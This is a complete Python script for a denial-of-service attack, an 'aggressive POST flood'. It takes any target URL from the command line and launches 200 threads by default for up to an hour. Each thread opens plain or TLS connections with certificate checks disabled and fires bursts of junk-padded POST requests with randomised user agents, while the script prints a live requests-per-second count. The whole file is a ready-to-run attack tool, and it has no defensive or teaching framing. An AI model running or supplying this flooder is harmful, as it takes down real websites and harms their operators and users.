#!/usr/bin/env python3
# aggressive_post_flood.py

import socket
import ssl
import threading
import random
import time
import sys
from urllib.parse import urlparse

class AggressivePOSTFlood:
    def __init__(self, target, threads=200, duration=3600):
        self.target = target
        self.threads = threads
        self.duration = duration
        self.running = True
        self.request_count = 0
        self.start_time = time.time()
        
        parsed = urlparse(target)
        self.host = parsed.hostname
        self.port = 443 if parsed.scheme == 'https' else 80
        self.path = parsed.path if parsed.path else '/'
        self.use_ssl = parsed.scheme == 'https'
    
    def create_payload(self):
        data = 'A' * random.randint(500, 2000)
        ua = f"Mozilla/5.0 (X{random.randint(1,99)})"
        
        payload = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(data)}\r\n"
            f"Connection: keep-alive\r\n\r\n"
            f"{data}"
        )
        return payload.encode()
    
    def attack(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                
                if self.use_ssl:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=self.host)
                
                sock.connect((self.host, self.port))
                
                # Rapid fire
                for _ in range(20):
                    if not self.running:
                        break
                    sock.send(self.create_payload())
                    self.request_count += 1
                
                sock.close()
            except:
                pass
            
            if time.time() - self.start_time > self.duration:
                self.running = False
    
    def stats(self):
        while self.running:
            elapsed = time.time() - self.start_time
            rps = self.request_count / elapsed if elapsed > 0 else 0
            print(f"\r[+] POST Requests: {self.request_count} | RPS: {rps:.2f} | Active: {threading.active_count()-1} | {elapsed:.1f}s", end='')
            sys.stdout.flush()
            time.sleep(0.3)
    
    def start(self):
        print(f"[+] Aggressive POST Flood Attack")
        print(f"[+] Target: {self.target}")
        print(f"[+] Threads: {self.threads}")
        print(f"[+] Duration: {self.duration}s\n")
        
        threading.Thread(target=self.stats, daemon=True).start()
        
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.attack, daemon=True)
            t.start()
            threads.append(t)
        
        try:
            for t in threads:
                t.join()
        except KeyboardInterrupt:
            print("\n[!] Stopped")
            self.running = False
        
        print(f"\n[+] Total: {self.request_count} | Avg RPS: {self.request_count/(time.time()-self.start_time):.2f}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 aggressive_post_flood.py <target> [threads] [duration]")
        sys.exit(1)
    
    target = sys.argv[1]
    threads = int(sys.argv[2]) if len(sys.argv) > 2 else 200
    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 3600
    
    flooder = AggressivePOSTFlood(target, threads, duration)
    flooder.start()
